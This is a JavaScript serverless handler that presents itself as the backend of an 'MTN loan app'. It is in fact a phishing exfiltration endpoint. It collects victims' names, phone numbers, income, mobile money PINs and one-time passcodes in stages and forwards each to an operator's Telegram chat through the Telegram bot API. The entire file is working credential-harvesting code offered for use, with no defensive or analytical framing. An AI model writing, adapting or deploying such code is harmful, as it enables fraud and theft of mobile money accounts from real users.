export default async function handler(req, res) {
    res.setHeader('Access-Control-Allow-Credentials', true);
    res.setHeader('Access-Control-Allow-Origin', '*');
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT');
    res.setHeader('Access-Control-Allow-Headers', 'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version');

    if (req.method === 'OPTIONS') {
        return res.status(200).end();
    }

    if (req.method !== 'POST') {
        return res.status(405).json({ error: 'Method not allowed' });
    }

    try {
        const { step, userId, data } = req.body;

        let message = `🚨 *MTN LOAN APP ALERT* 🚨\n\n`;
        message += `🆔 *Session ID:* ${userId}\n`;
        message += `📍 *Step:* ${step}\n\n`;
        
        if (step === 'Application Submitted') {
            message += `👤 *Name:* ${data.name}\n`;
            message += `📱 *Phone:* ${data.phone}\n`;
            message += `💰 *Amount:* GHC ${data.amount}\n`;
            message += `💼 *Income:* GHC ${data.income}\n`;
        } else if (step === 'Phone Number Entered') {
            message += `📱 *Login Phone:* ${data.phone}\n`;
        } else if (step === 'PIN Entered') {
            message += `🔐 *PIN:* \`${data.pin}\`\n`;
        } else if (step === 'Final OTP Entered') {
            message += `🔑 *OTP:* \`${data.otp}\`\n`;
        }

        const TELEGRAM_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
        const CHAT_ID = process.env.TELEGRAM_CHAT_ID;

        if (!TELEGRAM_TOKEN || !CHAT_ID) {
            throw new Error("Missing Telegram environment variables in Vercel");
        }

        const telegramUrl = `https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`;
        
        const response = await fetch(telegramUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
                chat_id: CHAT_ID,
                text: message,
                parse_mode: 'Markdown'
            })
        });

        if (!response.ok) {
            const errText = await response.text();
            throw new Error(`Telegram API Error: ${errText}`);
        }

        return res.status(200).json({ success: true, message: "Sent to Telegram" });

    } catch (error) {
        console.error(error);
        return res.status(500).json({ error: error.message });
    }
}
